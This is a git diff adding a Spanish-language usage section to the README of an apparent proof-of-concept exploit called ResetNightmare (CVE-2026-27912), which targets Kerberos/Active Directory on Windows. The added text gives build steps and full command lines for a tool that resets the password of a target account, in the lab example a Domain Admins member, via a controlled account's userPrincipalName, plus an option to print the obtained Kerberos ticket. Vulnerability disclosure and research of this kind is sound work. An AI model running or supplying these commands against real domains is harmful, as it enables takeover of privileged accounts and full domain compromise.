@@ -4,6 +4,55 @@
 
 **ResetNightmare**, [CVE-2026-27912](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-27912), fue descubierta por **Shai Laron**, investigador de [Semperis](https://www.linkedin.com/company/semperis/). Más información en [@SemperisTech](https://x.com/semperistech).
 
+
+## Modo de uso
+
+El PoC se compila para Windows x64 mediante MinGW-w64. El `Makefile` genera `resetnightmare_rajkitpoc.exe`.
+
+```bash
+cd POC
+make
+```
+La sintaxis soportada por el cliente es:
+
+```powershell
+.\resetnightmare_rajkitpoc.exe `
+    --t <target-account> `
+    --u <controlled-account> `
+    --controlled-password <controlled-password> `
+    --new-target-password <new-target-password> `
+    --d <domain-controller> `
+    --e AES256 `
+    --execute
+```
+
+Para imprimir también el ticket Kerberos generado:
+
+```powershell
+.\resetnightmare_rajkitpoc.exe `
+    --t rn-target `
+    --u rn-controlled `
+    --controlled-password <PASSWORD_CONTROLLED> `
+    --new-target-password <NEW_TARGET_PASSWORD> `
+    --d dc01.jellybeelab.local `
+    --e AES256 `
+    --execute `
+    --print-Ticket
+```
+
+| Parámetro | Descripción |
+|---|---|
+| `--t` | Cuenta objetivo |
+| `--u` | Cuenta controlada cuyo `userPrincipalName` puede modificarse |
+| `--controlled-password` | Contraseña de la cuenta controlada |
+| `--new-target-password` | Nueva contraseña destinada a la cuenta objetivo |
+| `--d` | Controlador de dominio, si se omite el cliente intenta descubrirlo automáticamente |
+| `--e` | Tipo de cifrado, `AES256`, `AES128` o `RC4` |
+| `--execute` | Habilita la ejecución del flujo |
+| `--print-Ticket` | Muestra el `KRB-CRED` obtenido durante la ejecución |
+
+
+
 ## Mini análisis de ingeniería inversa sobre `kdcsvc.dll`
 
 La prueba se ejecuta desde `jellybeelab\rn-low`. El cliente utiliza `rn-controlled` como cuenta controlada, conozco su contraseña y puedo modificar su `userPrincipalName`. El objetivo es `rn-target`, una cuenta distinta perteneciente a **Domain Admins**, cuya contraseña inicial no conozco.
